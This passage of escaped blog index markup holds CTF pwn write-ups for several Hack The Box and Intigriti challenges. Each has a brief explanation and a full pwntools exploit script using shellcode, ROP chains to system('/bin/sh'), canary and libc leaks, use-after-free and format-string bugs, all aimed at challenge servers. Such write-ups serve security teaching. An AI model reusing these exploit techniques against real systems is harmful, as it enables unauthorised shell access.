objdump -d ./egg | grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&amp;quot;/&#39;|sed &#39;s/$/&amp;quot;/g&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./hunting&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,31599)
elf=ELF(&amp;quot;./hunting&amp;quot;)

shellcode=b&amp;quot;\x68\x80\x00\x00\x00\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x6a\x01\x5b\x89\xd1\x6a\x50\x5a\xb0\x04\xcd\x80&amp;quot;

# gdb.attach(io)
# pause()

io.send(shellcode)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;oxidized-rop&#34;&gt;Oxidized ROP&lt;/h3&gt;
&lt;p&gt;written by rust , logical vuln and how rust parse our input are key to this chall&lt;br&gt;
in a word we need to fulfil the check&lt;br&gt;
&lt;code&gt;0x55f494f01897 &amp;lt;oxidized_rop::present_config_panel+7&amp;gt;     cmp    dword ptr [rdi], 1e240h&lt;/code&gt;&lt;br&gt;
and the low bytes of &lt;code&gt;[rdi]&lt;/code&gt; will be replaced by a unicode we input in option1 , use the following&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# **ğ‰€**

## U+1E240

### [0x1E240](https://numeral.bayashi.net/0x1E240 &amp;quot;ğ‰€ - 0x1E240&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./oxidized-rop&amp;quot;)
# io=remote(&amp;quot;159.65.20.166&amp;quot;,30248)
elf=ELF(&amp;quot;./oxidized-rop&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;Selection: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot; (max 200 characters): &amp;quot;,&amp;quot;ğ‰€&amp;quot;*199)
io.sendlineafter(b&amp;quot;Selection: &amp;quot;,b&amp;quot;2&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;arms-roped&#34;&gt;Arms roped:&lt;/h3&gt;
&lt;p&gt;annoying chall without correct libc in docker , 0 out of 10 ğŸ˜…ğŸ˜…ğŸ˜…&lt;br&gt;
several points need to mention:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\x00&lt;/code&gt; cut off when leaking addr&lt;/li&gt;
&lt;li&gt;ARM instruction alignment&lt;/li&gt;
&lt;li&gt;disturbing offsets ğŸ˜…ğŸ˜…ğŸ˜…&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
# remote_addr = [&amp;quot;167.99.82.136&amp;quot;,32375]
remote_addr = [&amp;quot;167.99.85.216&amp;quot;,31954]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./arms_roped&amp;quot;]) 
    elf = ELF(&amp;quot;./arms_roped&amp;quot;)
    # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # io = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        io = remote(remote_addr[0],remote_addr[1])
        elf = ELF(&amp;quot;./arms_roped&amp;quot;)
        # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

### leak canary
payload=b&amp;quot;a&amp;quot;*0x21
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x21)
canary=u32(io.recv(3)[-4:].rjust(4,b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))


### leak base
payload=b&amp;quot;a&amp;quot;*0x30
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x30)
# base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))+0x40000000-0x948
base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-0x948
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))


### leak libc
payload=b&amp;quot;a&amp;quot;*0x48
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x48)
leak_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-153-0x1748C
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

# sys_addr=leak_addr+0x2F5C8 9.9
sys_addr=leak_addr+0x2F510+1  # alignment
### 0002F510

# str_sh=leak_addr+0x0DCE38 9.9
str_sh=leak_addr+0x0DCE0C
### 00DCE0C

log.success(&amp;quot;sys_addr: &amp;quot;+hex(sys_addr))
log.success(&amp;quot;str_sh: &amp;quot;+hex(str_sh))


# 0x000009ec: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x000009d8: mov r0, r7; add r4, r4, #1; blx r3;
# 0x0000056c: pop {r3, pc};

mov_all=base_addr+0x9d8
pop_r4_r5_r6_r7_r8_sb_sl_pc=base_addr+0x9ec
pop_r3_pc=base_addr+0x56c


log.success(&amp;quot;mov_all: &amp;quot;+hex(mov_all))
log.success(&amp;quot;pop_r4_r5_r6_r7_r8_sb_sl_pc: &amp;quot;+hex(pop_r4_r5_r6_r7_r8_sb_sl_pc))
log.success(&amp;quot;pop_r3_pc: &amp;quot;+hex(pop_r3_pc))


payload=cyclic(0x20)+p32(canary)+p32(0xdeadbeef)*3
payload+=p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)

payload+=p32(0)*3
payload+=p32(str_sh) # r7-&amp;gt;str_sh
payload+=p32(0)*3
payload+=p32(pop_r3_pc)

payload+=p32(sys_addr)+p32(mov_all)

io.sendline(payload)

# io.sendline(b&amp;quot;quit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HTB_Challenges</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/shHGM9hmT/"" data-c="
          &lt;h2 id=&#34;tldr&#34;&gt;TL;DRï¼š&lt;/h2&gt;
&lt;p&gt;nothing here.&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;pwn_great_old_talisman&#34;&gt;pwn_great_old_talisman:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;no check for the input, we could use this to perform a oob write&lt;/li&gt;
&lt;li&gt;overwrites the low 2bytes of &lt;code&gt;exit@got[plt]&lt;/code&gt; to that of  &lt;code&gt;read_flag&lt;/code&gt; func&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./great_old_talisman&amp;quot;)
io=remote(&amp;quot;94.237.54.197&amp;quot;,53139)
elf=ELF(&amp;quot;./great_old_talisman&amp;quot;)
libc=elf.libc

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(-4))

io.sendafter(b&amp;quot;Spell: &amp;quot;,b&amp;quot;\x5a\x13&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pwn_zombienator&#34;&gt;pwn_zombienator:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;use &lt;code&gt;delete&lt;/code&gt; to make a libc_addr leakage and we have all the addr we need for rop chain&lt;/li&gt;
&lt;li&gt;in &lt;code&gt;attack&lt;/code&gt; function we have a chance to directly write on the stack , due to the &lt;code&gt;scanf&lt;/code&gt; as input , use &lt;code&gt;+&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt; to not to overwrite until the return addr , to bypass the canary check . And we have our rop chain written on return addr .&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;( be careful when we write our rop chain , it uses &lt;code&gt;scanf(&amp;quot;%lf&amp;quot;)&lt;/code&gt; , so we have to use double formation as input&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./zombienator&amp;quot;)
io=remote(&amp;quot;94.237.58.77&amp;quot;,50672)
elf=ELF(&amp;quot;./zombienator&amp;quot;)
libc=elf.libc

def double_float(value):
    return str(struct.unpack(&#39;!d&#39;, p64(value)[::-1])[0])

def add(s,n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;tier: &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;9): &amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;position: &amp;quot;,str(n))

def show():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

def attack():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)

# gdb.attach(io)
# pause()

for i in range(8):
    add(0x80,i)

add(0x20,8)

for i in range(8):
    delete(i)

show()

io.recvuntil(b&amp;quot;Slot [7]: &amp;quot;)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

pop_rdi=leak_addr+0x2a3e5
# 0x000000000002a3e5: pop rdi; ret;

ret=leak_addr+0xf9e3c
# 0x00000000000f9e3c: ret;

print(&amp;quot;str_sh: &amp;quot;,hex(str_sh))
print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))

rop=[double_float(ret),double_float(pop_rdi),double_float(str_sh),double_float(sys_addr)]

attack()
io.sendlineafter(b&amp;quot;attacks: &amp;quot;,b&amp;quot;39&amp;quot;)

for i in range(35):
    io.sendlineafter(b&amp;quot;coordinates: &amp;quot;,b&amp;quot;+&amp;quot;)

# gdb.attach(io)
# pause()

for i in range(4):
    io.sendlineafter(b&amp;quot;coordinates: &amp;quot;,rop[i])    

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pwn_zombiedote&#34;&gt;pwn_zombiedote:&lt;/h3&gt;
&lt;p&gt;just like the chall before  , this one also uses &lt;code&gt;%lf&lt;/code&gt; as input and it has even &lt;code&gt;%lf&lt;/code&gt; as output , so just write 2 func to perform as &lt;code&gt;encode and decode&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;malloc a huge size to cover as many sections as it can in memory , therefore we can perform a aaw read or write&lt;/li&gt;
&lt;li&gt;one chance for the &lt;code&gt;inspect&lt;/code&gt; function , use it to leak the libc in libc section , the offset needs to be manually tested .&lt;/li&gt;
&lt;li&gt;idk what the intend solution is , I tried to hijack the &lt;code&gt;exit_hook&lt;/code&gt;(I named it , offset tested manually) , where we have access to write to , and it will finally be called in the &lt;code&gt;exit&lt;/code&gt; function , we could overwrite it with &lt;code&gt;one_gadget&lt;/code&gt; , choose the proper one to fulfill the restrictions .&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;83.136.255.126&amp;quot;,55297)
# io=process(&amp;quot;./zombiedote&amp;quot;)
elf=ELF(&amp;quot;./zombiedote&amp;quot;)
libc=elf.libc

def double_float(value):
    return str(struct.unpack(&#39;!d&#39;, p64(value)[::-1])[0])

def double_to_hex(val):
    return int.from_bytes(struct.pack(&amp;quot;d&amp;quot;, val), &amp;quot;little&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;samples: &amp;quot;,str(s))

def insert(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;tested: &amp;quot;,str(s))


def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;number: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;(%): &amp;quot;,double_float(cc))

def show(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;inspect: &amp;quot;,str(s))
    io.recvuntil(b&amp;quot;: &amp;quot;)
    hex_string=double_to_hex(float(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True)))
    print(&amp;quot;hex_string: &amp;quot;,hex(hex_string))
    return hex_string

# gdb.attach(io)

add(0x40040000)
print(&amp;quot;test: &amp;quot;,double_to_hex(1.619794219890527e-319))

### libc_leakage
leak_addr=show(0x40083af0)-0x2197e3
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
exit_hook=leak_addr+0x21a6c8
shell=leak_addr+0xeea9c

pop_rdi=leak_addr+0x2e6c5
# 0x000000000002e6c5: pop rdi; ret;

ret=leak_addr+0x2c7a9
# 0x000000000002c7a9: ret;

# rop_addr=leak_addr-0x200203ff0
# rop=[ret,pop_rdi,str_sh,sys_addr]
insert(0x4)
for i in range(4):
    io.sendlineafter(b&amp;quot;(%): &amp;quot;,double_float(0xdeadbeef))

#  RBX  0x7ffff7fb26c8 (__elf_set___libc_atexit_element__IO_cleanup__) â€”â–¸ 0x7ffff7e86a9c (execvpe+652) â—‚â€” mov rdx, r12
#    0x7ffff7de157d &amp;lt;__run_exit_handlers+429&amp;gt;    jae    7ffff7de158bh                 &amp;lt;__run_exit_handlers+443&amp;gt;
#    0x7ffff7de157f &amp;lt;__run_exit_handlers+431&amp;gt;    nop
#  â–º 0x7ffff7de1580 &amp;lt;__run_exit_handlers+432&amp;gt;    call   qword ptr [rbx]

# gdb.attach(io)

edit(5,0)
edit(0x40083cd7,shell)
io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

io.interactive()

# 0xeea9c execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeea9f execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeeaa2 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">HTB_University_CTF_2023 </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JbINLA9Ja/"" data-c="
          &lt;h3 id=&#34;tldr&#34;&gt;TL;DR:&lt;/h3&gt;
&lt;p&gt;nothing here .&lt;/p&gt;
&lt;h3 id=&#34;hidden&#34;&gt;Hidden:&lt;/h3&gt;
&lt;p&gt;PIE enabled , partial write is ok , 1/16 chance to meet the 1bit bruteforce , I was too lazy to write the bruteforce script so I&#39;ll just put up the normal one:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;hidden.ctf.intigriti.io&amp;quot;,1337)

# gdb.attach(io)
# pause()

payload=cyclic(0x48)+b&amp;quot;\xd9\x91&amp;quot;
io.sendafter(b&amp;quot;something:\n&amp;quot;,payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;floor-mat-store&#34;&gt;Floor Mat Store:&lt;/h3&gt;
&lt;p&gt;the flag stored on the stack can be leaked through the fsa , the only thing we need to do is to use gdb to make clear the offset , no script need to write&lt;br&gt;
first input 6 to read the flag to the stack , then leak it with &lt;code&gt;%10$s&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1700327407102.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;over-the-edge&#34;&gt;Over The Edge:&lt;/h3&gt;
&lt;p&gt;only provided a socket script to us , the main logic was to use the int overflow to bypass the check . Use the function in original script to help understand .&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
import numpy as np
import warnings
import socket
import threading
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)


io=remote(&amp;quot;edge.ctf.intigriti.io&amp;quot;,1337)

input_data = ((1&amp;lt;&amp;lt;64)-1402)

def process_input(input_value):
    num1 = np.array([0], dtype=np.uint64)
    num2 = np.array([0], dtype=np.uint64)
    num2[0] = 0
    a = input_value
    if a &amp;lt; 0:
        return &amp;quot;Exiting...&amp;quot;
    num1[0] = (a + 65)
    print(&amp;quot;num2[0] =&amp;quot; ,num2[0])
    print(&amp;quot;num1[0] =&amp;quot; ,num1[0])
    print(&amp;quot;num2[0] - num1[0] = &amp;quot;,num2[0]-num1[0])
    if (num2[0] - num1[0]) == 1337:
        return &#39;You won!\n&#39;
    return &#39;Try again.\n&#39;

input_value = int(input_data)
print(&amp;quot;input_value: &amp;quot;,input_value)


response = process_input(input_value)

print(&amp;quot;response: &amp;quot;,response)


io.sendlineafter(b&amp;quot;edge!\n&amp;quot;,str(input_data))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;maltigriti&#34;&gt;Maltigriti:&lt;/h3&gt;
&lt;p&gt;to get the flag we need our report level to be &lt;code&gt;A&lt;/code&gt; and the bounty num to be bigger than the value it gives&lt;br&gt;
there exists an uaf vuln in &lt;code&gt;logout&lt;/code&gt; function , which is key to success&lt;br&gt;
first we created the user with the bio , we could cover some value at the same time(later these values will be the in report structure)&lt;br&gt;
remeber the bio size should be the same as the &lt;code&gt;report chunk size&lt;/code&gt; for the first fit principle&lt;br&gt;
once we created it&lt;br&gt;
and then we use &lt;code&gt;logout&lt;/code&gt; to create the uaf , the next time when we add a new report it&#39;ll be signed on the freed chunk&lt;br&gt;
after that we leak the heap addr with &lt;code&gt;edit&lt;/code&gt; function , we need the heap addr that points to user chunk to fulfill the need of &lt;code&gt;calculate_balance&lt;/code&gt;&lt;br&gt;
meanwhile in  &lt;code&gt;edit&lt;/code&gt; function we have a chance to overwrite the report , fill it with the payload&lt;br&gt;
finally call the &lt;code&gt;buy_swag_pack&lt;/code&gt; function and there should be flag printed&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./maltigriti&amp;quot;)
io=remote(&amp;quot;maltigriti.ctf.intigriti.io&amp;quot;,1337)
elf=ELF(&amp;quot;./maltigriti&amp;quot;)
libc=elf.libc

def reg(s,cc):
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;name&amp;gt; &amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;password&amp;gt; &amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;your bio&amp;gt; &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,cc)
    
def edit_bio():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    # io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,cc)
    
def add_report(c1,c2):
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;title&amp;gt; &amp;quot;,c1)
    io.sendlineafter(b&amp;quot;report&amp;gt; &amp;quot;,c2)
    
def show():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    
def get_flag():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;5&amp;quot;)
    
def uaf():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;6&amp;quot;)
    

# gdb.attach(io)
# pause()

reg(0xc0,b&amp;quot;A&amp;quot;*0x50)
uaf()
add_report(b&amp;quot;A&amp;quot;*0x18,b&amp;quot;A&amp;quot;*0x50)

edit_bio()
io.recvuntil(b&amp;quot;is: &amp;quot;)
ptr_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;ptr_addr: &amp;quot;,hex(ptr_addr))

io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,p64(ptr_addr)+b&amp;quot;A&amp;quot;*0x10)

get_flag()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;reading-in-the-dark&#34;&gt;Reading in the Dark:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;this one was confusing at a period , for a long time I tried to modify the string `story.txt`  but later I found that the section was `read only` lmao
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the whole program provide us with several functions , they deal with the our requests with its own rules , the input should be like &lt;code&gt;|{}|{}|{}|&lt;/code&gt;&lt;br&gt;
and for every &lt;code&gt;{}&lt;/code&gt; , there&#39;s a brief explanation:&lt;br&gt;
the first one was used to pass the &lt;code&gt;timestamp&lt;/code&gt; , which is used as the &lt;strong&gt;authentication&lt;/strong&gt; , we need this to bypass those annoying checks&lt;br&gt;
the second one was used as options to enter different functions, ranging from &lt;code&gt;1-4&lt;/code&gt;&lt;br&gt;
the third and the last one , uhh , no use , pass&lt;br&gt;
the main vuln we need to exploit is the buffer overflow in &lt;code&gt;admin_read&lt;/code&gt; function , there is a &lt;code&gt;fread&lt;/code&gt; which will cause a &lt;code&gt;8-bytes&lt;/code&gt; overflow , we could prepare a rop chain on stack and use stack migration to the rop chain we prepared just now&lt;br&gt;
so let&#39;s begin , the following are the main steps (comes out after debugging with gdb):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;get timestamp and leak address and canary at the same time (there is format string vuln in &lt;code&gt;parse_function&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;as we get the timestamp in step 1 , we use &lt;code&gt;(1&amp;lt;&amp;lt;32)+time_stamp&lt;/code&gt; as our new &lt;code&gt;timestamp&lt;/code&gt; ,  &lt;code&gt;parse_timestamp_new&lt;/code&gt; uses &lt;code&gt;atol&lt;/code&gt; to proceed the &lt;code&gt;timestamp&lt;/code&gt; ,unlike &lt;code&gt;atoi&lt;/code&gt; in &lt;code&gt;parse_timestamp&lt;/code&gt; function , the int overflow will happen in &lt;code&gt;parse_timestamp&lt;/code&gt;  but not in &lt;code&gt;parse_timestamp_new&lt;/code&gt; , therefore we could bypass checks in these two functions.&lt;/li&gt;
&lt;li&gt;after that we enter the &lt;code&gt;admin_read&lt;/code&gt; function , the &lt;code&gt;1-byte&lt;/code&gt; aaw read is actually useless , we only need to focus on the &lt;code&gt;fread&lt;/code&gt; , set up a rop chain on stack and use &lt;code&gt;leave; ret;&lt;/code&gt; to perform a stack migration to the rop chain , then we get root shell&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./RITD&amp;quot;)
io=remote(&amp;quot;ritd.ctf.intigriti.io&amp;quot;,1337)
elf=ELF(&amp;quot;./RITD&amp;quot;)
libc=ELF(&amp;quot;./libc6_2.35-0ubuntu3.1_amd64.so&amp;quot;)

def menu(c0,c1,c2):
    opt=&amp;quot;|{}|{}|{}|&amp;quot;.format(c0,c1,c2)
    ### c0 used as timestamp
    ### c1 1-4
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,opt)

# gdb.attach(io)
# pause()

menu(&#39;1&#39;,&#39;11111111.%77$p.%76$p.%80$p.%75$p&#39;,&#39;1&#39;) #get timestamp
io.recvuntil(b&amp;quot;.&amp;quot;)

base_addr=int(io.recv(14),16)-0x1a45
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))
menn=base_addr+0x19ab+373
story_addr=base_addr+0x20e3

io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=int(io.recv(14),16)
ret_addr=stack_addr-0x48
ptr_addr=ret_addr-0x38
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))
print(&amp;quot;ret_addr: &amp;quot;,hex(ret_addr))
print(&amp;quot;ptr_addr: &amp;quot;,hex(ptr_addr))


io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-0x219aa0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

shell=leak_addr+0xebdb3
pop_rdi=leak_addr+0x2a3e5
leave_ret=leak_addr+0x0562ec
ret=leak_addr+0x29cd6
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

io.recvuntil(b&amp;quot;.&amp;quot;)
canary=int(io.recv(18),16)
print(&amp;quot;canary: &amp;quot;,hex(canary))

io.recvuntil(b&amp;quot;\n&amp;quot;)
time_stamp=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)
print(&amp;quot;time_stamp: &amp;quot;,time_stamp)

idx=((1&amp;lt;&amp;lt;32)+time_stamp) #overflow 

# menu(idx,&#39;2&#39;,&#39;1&#39;) #check timestamp

# menu(idx,&#39;3&#39;,&#39;1&#39;) # FILE*

# gdb.attach(io)
# pause()

menu(idx,&#39;4&#39;,&#39;1&#39;) # aaw

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;0x)\n&amp;quot;,hex(ret_addr+0x8)[2:])
io.sendlineafter(b&amp;quot;there?\n&amp;quot;,str(ret_addr))
io.sendafter(b&amp;quot;read?\n&amp;quot;,b&amp;quot;a&amp;quot;*7+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)+p64(canary)+p64(ret_addr-0x30)+p64(leave_ret))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Intigriti CTF 2023 PWN</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LIbdQfEF3/"" data-c="
          &lt;h3 id=&#34;å‰è¨€&#34;&gt;å‰è¨€ï¼š&lt;/h3&gt;
